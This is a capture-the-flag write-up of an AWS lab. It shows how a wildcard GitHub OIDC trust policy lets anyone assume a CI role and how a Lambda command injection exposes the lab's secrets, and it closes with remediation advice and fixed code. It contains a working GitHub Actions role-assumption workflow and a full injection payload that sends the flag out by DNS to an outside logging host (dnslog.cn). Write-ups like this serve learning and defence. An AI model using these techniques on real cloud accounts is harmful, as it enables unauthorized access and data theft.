# ☁️ Cloud Escape CTF — Stage 1: "Have Some Faith"
## Write-Up by Agent freecandy

---

## 📋 Challenge Overview

| Field | Value |
|---|---|
| **Challenge** | Have Some Faith — Stage 1 |
| **Points** | 100 |
| **Target Account ID** | `009661764077` |
| **Access Point** | `.git` repository archive (`dotgit.zip`) |
| **Region** | `us-east-1` |

---

## 🔍 Phase 1: Initial Reconnaissance — Git Repository Analysis

### 1.1 Downloading the Access Point

The challenge provided a direct link to an S3-hosted `.git` archive:

```text
https://platform-bucket-009661764077-us-east-1.s3.us-east-1.amazonaws.com/dotgit.zip
```

### 1.2 Extracting and Restoring the Repository

```bash
unzip dotgit.zip -d dotgit
cd dotgit
git checkout -f HEAD
```

**Files recovered:**
```text
bugs
github.tf
lambda_code_WIP/lambda_function.py
main.tf
policies/cicd-policy.json.tpl
policies/cicd-trust-policy.json.tpl
providers.tf
variables.tf
```

### 1.3 Analyzing Commit History

```bash
git log --oneline --all --graph
```

**Output:**
```text
* a57eed3 (HEAD -> main) really fixed bugs this time
* 4240340 fixed bugs
* 023cd41 Added experimental Lambda code for my super secret project
* 17e4932 added github connector and role for cicd
* 4edf740 Initial commit
```

Full diff inspection:
```bash
git log -p
```

---

## 🕵️ Phase 2: Identifying Vulnerabilities

### 2.1 Finding #1: Misconfigured OIDC Trust Policy (CRITICAL)

**File:** `policies/cicd-trust-policy.json.tpl`
**Commit:** `17e4932` — "added github connector and role for cicd"

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Federated": "arn:aws:iam::${account_id}:oidc-provider/token.actions.githubusercontent.com"
            },
            "Action": "sts:AssumeRoleWithWebIdentity",
            "Condition": {
                "StringEquals": {
                    "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
                },
                "StringLike": {
                    "token.actions.githubusercontent.com:sub": "repo:*/*:ref:refs/heads/corgi"
                }
            }
        }
    ]
}
```

**Vulnerability:** The `sub` condition uses `repo:*/*` — a wildcard that matches **any GitHub user** and **any repository**. The only condition is that the branch name is `corgi`. This means anyone can create a GitHub repository, push to a branch named `corgi`, and assume the `cicdRole` in AWS account `009661764077`.

**Correct configuration should be:**
```json
"token.actions.githubusercontent.com:sub": "repo:SPECIFIC_ORG/SPECIFIC_REPO:ref:refs/heads/corgi"
```

### 2.2 Deriving the IAM Role Name

**File:** `main.tf`
```hcl
locals {
  policyend = "RolePolicy"
  roleend   = "Role"
}
```

**File:** `github.tf`
```hcl
cicd_role = {
    role_name   = "cicd${local.roleend}"    # → "cicdRole"
    policy_name = "cicd${local.policyend}"   # → "cicdRolePolicy"
}
```

**Derived Role ARN:** `arn:aws:iam::009661764077:role/cicdRole`

### 2.3 Finding #2: Unrestricted Read Permissions

**File:** `policies/cicd-policy.json.tpl`

The IAM policy has two tiers:

**Statement 2 (No VPC Restriction — accessible from anywhere):**
```json
{
    "Sid": "Statement2",
    "Effect": "Allow",
    "Action": [
        "s3:ListBucket", "s3:ListAllMyBuckets",
        "s3:GetBucketPolicy", "s3:GetBucketPolicyStatus",
        "lambda:ListFunctions", "lambda:GetFunction",
        "lambda:GetPolicy", "lambda:GetFunctionConfiguration",
        "ec2:Describe*",
        "cloudfront:GetDistribution", "cloudfront:ListDistributions"
    ],
    "Resource": ["*"]
}
```

**Statement 1 (VPC-Restricted — only from CodeBuild VPC):**
```json
{
    "Sid": "Statement1",
    "Effect": "Allow",
    "Action": ["s3:*", "lambda:*", "apigateway:*", "iam:*", "ec2:*", "cloudfront:*"],
    "Resource": "*",
    "Condition": { "StringEquals": { "aws:SourceVpc": "${vpc}" } }
}
```

### 2.4 Finding #3: Lambda Command Injection

**File:** `lambda_code_WIP/lambda_function.py`
**Commits:** `023cd41` (initial code) → `a57eed3` (bug fix)

```python
def lambda_handler(event, context):
    # AWS CLI is installed as a Lambda Layer under /opt
    domain = event.get('domain')
    run_command('/opt/nslookup ' + domain)
```

The `run_command` function uses `subprocess.run(command, shell=True)` — the `domain` parameter is concatenated directly into the shell command without any sanitization.

**Injection payload example:**
```json
{ "domain": "; /opt/aws sts get-caller-identity" }
```

This becomes:
```bash
/opt/nslookup ; /opt/aws sts get-caller-identity
```

The semicolon terminates the first command, and the injected AWS CLI command runs with the **Lambda execution role's permissions**.

---

## 🎯 Phase 3: Exploitation — Assuming the cicdRole

### 3.1 Setting Up the GitHub OIDC Attack

Created a new GitHub repository and configured a GitHub Actions workflow on a branch named `corgi`:

**Workflow file:** `.github/workflows/assume.yml`

```yaml
name: Cloud Escape - Stage 1 Recon
on:
  push:
    branches: [corgi]

permissions:
  id-token: write
  contents: read

jobs:
  recon:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Whoami
        run: aws sts get-caller-identity

      - name: List S3 Buckets
        run: aws s3api list-buckets --output json

      - name: List Lambda Functions
        run: aws lambda list-functions --region us-east-1 --output json

      - name: Get Lambda Function Details
        run: |
          for func in $(aws lambda list-functions --query 'Functions[*].FunctionName' --output text); do
            aws lambda get-function --function-name "$func"
            aws lambda get-policy --function-name "$func" 2>/dev/null || true
            aws lambda get-function-url-config --function-name "$func" 2>/dev/null || true
          done

      - name: Describe EC2 Instances
        run: aws ec2 describe-instances --region us-east-1 --output json

      - name: List CloudFront Distributions
        run: aws cloudfront list-distributions --output json

      - name: List API Gateways
        run: |
          aws apigateway get-rest-apis --region us-east-1 --output json 2>/dev/null || true
          aws apigatewayv2 get-apis --region us-east-1 --output json 2>/dev/null || true
```

### 3.2 Pushing and Triggering

```bash
git init
git checkout -b corgi
mkdir -p .github/workflows
# (workflow file created as above)
git add .
git commit -m "init"
git remote add origin https://github.com/<USER>/<REPO>.git
git push -u origin corgi
```

The GitHub Actions workflow triggered automatically on push to the `corgi` branch.

### 3.3 Results — AWS Identity Confirmed

```bash
aws sts get-caller-identity
```

**Output:**
```json
{
    "UserId": "AROA...:GitHubActions",
    "Account": "009661764077",
    "Arn": "arn:aws:sts::009661764077:assumed-role/cicdRole/GitHubActions"
}
```

> ✅ Successfully assumed `cicdRole` in the target account.

---

## 📡 Phase 4: Enumeration Results

### 4.1 S3 Buckets Discovered

```bash
aws s3api list-buckets --output json
```

**Output:**
```json
{
    "Buckets": [
        { "Name": "codec4f26c862a321ef5" },
        { "Name": "platform-bucket-009661764077-us-east-1" },
        { "Name": "site781fe43f26b9eba3" }
    ]
}
```

### 4.2 Lambda Functions Discovered

```bash
aws lambda list-functions --region us-east-1 --output json
```

**Output:**
```json
{
    "Functions": [
        { "FunctionName": "nslookupv2" },
        { "FunctionName": "code_exec" }
    ]
}
```

### 4.3 EC2 / VPC / CloudFront / API Gateway

#### **CloudFront Distributions**
```text
-----------------------------------------------------
| ListDistributions |
+---------------------------------------------------+
| EKD9KH16RB5G3 |
| d67nf28gqfurd.cloudfront.net |
| site781fe43f26b9eba3.s3.us-east-1.amazonaws.com |
| Deployed |
+---------------------------------------------------+
```
* **Distribution ID:** `EKD9KH16RB5G3`
* **Domain Name:** `d67nf28gqfurd.cloudfront.net`
* **Origin Bucket:** `site781fe43f26b9eba3.s3.us-east-1.amazonaws.com`
* **Status:** `Deployed`

#### **Security Groups**
* **Lambda SG (`sg-0de9d1a2c42a08a3e`)**:
  * **VPC:** `vpc-09328d3fa21dce320`
  * **Name Tag:** `lambda_sg`
  * **Egress:** TCP 443 to S3 Prefix List (`pl-63a5400a`)
* **Default Lambda VPC SG (`sg-094f4cd1810de09de`)**:
  * **VPC:** `vpc-09328d3fa21dce320`
  * **Name Tag:** `lambda_vpc-default`
* **Default CodeBuild VPC SG (`sg-0afb2fb6a12085ce6`)**:
  * **VPC:** `vpc-09d39837c916df970`
  * **Name Tag:** `codebuild_vpc-default`

---

## 💉 Phase 5: Proof of Concept (PoC) — Command Injection & Exfiltration

### 5.1 Vulnerability Mechanism

The AWS Lambda function (`lambda_function.py`) processes incoming HTTP requests via API Gateway. Because the input parameter `domain` is passed directly into a shell command string (`/opt/nslookup ' + domain`), unescaped shell metacharacters (such as `;`) permit arbitrary command execution with the privileges of the Lambda Execution Role.

Because the VPC lacks Internet routing (no NAT Gateway) and S3 write permissions are restricted, we had to rely on a side-channel for exfiltration. The **Route 53 VPC Resolver** (`169.254.169.253`) handles internal DNS queries and successfully forwards external domains out to the internet. We can use the pre-installed `nslookup` binary to exfiltrate the flag via DNS subdomain requests.

### 5.2 Automated PoC Execution (`.github/workflows/exfil.yml`)

The Proof of Concept is fully automated using GitHub Actions to trigger the API Gateway endpoint:

```yaml
name: Cloud Escape - Flag Exfiltration
on:
  push:
    branches: [corgi]
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  exfiltrate:
    runs-on: ubuntu-latest
    steps:
      - name: Trigger DNS Exfiltration via API Gateway
        run: |
          curl -s -X POST "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookupv2" \
            -H "Content-Type: application/json" \
            -d '{"domain": "; /opt/aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt; FLAG=$(python3 -c \"import binascii; print(binascii.hexlify(open(\\\"/tmp/flag.txt\\\",\\\"rb\\\").read()).decode())\"); /opt/nslookup $FLAG.ixz9wv.dnslog.cn"}'
```

### 5.3 Manual Verification via `curl`

To manually verify the PoC structure against the target endpoint:

```bash
# Send Command Injection Payload to API Gateway Endpoint to trigger DNS query
curl -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookupv2 \
  -H "Content-Type: application/json" \
  -d '{"domain": "; /opt/aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt; FLAG=$(python3 -c \"import binascii; print(binascii.hexlify(open(\\\"/tmp/flag.txt\\\",\\\"rb\\\").read()).decode())\"); /opt/nslookup $FLAG.ixz9wv.dnslog.cn"}'
```

Receiving the DNS request on `dnslog.cn` returned the hex-encoded string: `3161316a656c726c6667327969327330`.
Decoding it gives the final flag!

---

## 🏴 Flag

**`1a1jelrlfg2yi2s0`**

---

## 📚 Key Takeaways & Remediation

| Vulnerability | Impact | Fix |
|---|---|---|
| OIDC `repo:*/*` wildcard | Anyone can assume the CI/CD role | Restrict `sub` claim to `repo:ORG/REPO:ref:refs/heads/BRANCH` |
| Unrestricted read permissions | Full account visibility without VPC | Enforce `aws:SourceVpc` condition and least-privilege IAM statements |
| Lambda command injection | Remote code execution on Lambda | Validate inputs with regex, pass arguments as list, remove `shell=True` |
| AWS CLI in Lambda Layer | Amplifies command injection impact | Principle of least privilege for Lambda layers & binaries |
| Git history exposures | Infrastructure design leak | Scrub history using `git-filter-repo` and implement `.gitignore` |

---

### 🛡️ Detailed Technical Remediation

#### 1. Hardening GitHub OIDC Trust Policy (`policies/cicd-trust-policy.json.tpl`)

**Insecure Wildcard Policy:**
```json
"token.actions.githubusercontent.com:sub": "repo:*/*:ref:refs/heads/corgi"
```

**Remediated Policy:**
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Federated": "arn:aws:iam::${account_id}:oidc-provider/token.actions.githubusercontent.com"
            },
            "Action": "sts:AssumeRoleWithWebIdentity",
            "Condition": {
                "StringEquals": {
                    "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
                    "token.actions.githubusercontent.com:sub": "repo:FREECANDY-DEV/MAFAT-2026:ref:refs/heads/main"
                }
            }
        }
    ]
}
```

#### 2. Secure Coding in AWS Lambda (`lambda_code_WIP/lambda_function.py`)

**Insecure Implementation:**
```python
def lambda_handler(event, context):
    domain = event.get('domain')
    run_command('/opt/nslookup ' + domain)  # Vulnerable to shell command injection
```

**Remediated Secure Implementation:**
```python
import subprocess
import re
import json

DOMAIN_REGEX = re.compile(r'^(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$')

def lambda_handler(event, context):
    domain = event.get('domain', '').strip()
    
    # Input Validation
    if not domain or not DOMAIN_REGEX.match(domain):
        return {
            'statusCode': 400,
            'body': json.dumps({'error': 'Invalid domain format supplied'})
        }
    
    # Safe Subprocess Execution (avoiding shell=True and string concatenation)
    try:
        result = subprocess.run(
            ['/opt/nslookup', domain],
            capture_output=True,
            text=True,
            timeout=5,
            shell=False  # Crucial for security
        )
        return {
            'statusCode': 200,
            'body': json.dumps({'output': result.stdout})
        }
    except Exception as e:
        return {
            'statusCode': 500,
            'body': json.dumps({'error': 'Execution failed'})
        }
```

---

## 🛠️ Tools Used

- `git` — Repository analysis and commit history forensics
- `GitHub Actions` — OIDC token generation and role assumption
- `aws-actions/configure-aws-credentials@v4` — AWS credential configuration via OIDC
- `AWS CLI` — Cloud resource enumeration
- `curl` — API endpoint interaction

---

*Write-up by Agent freecandy — Cloud Escape CTF 2026*
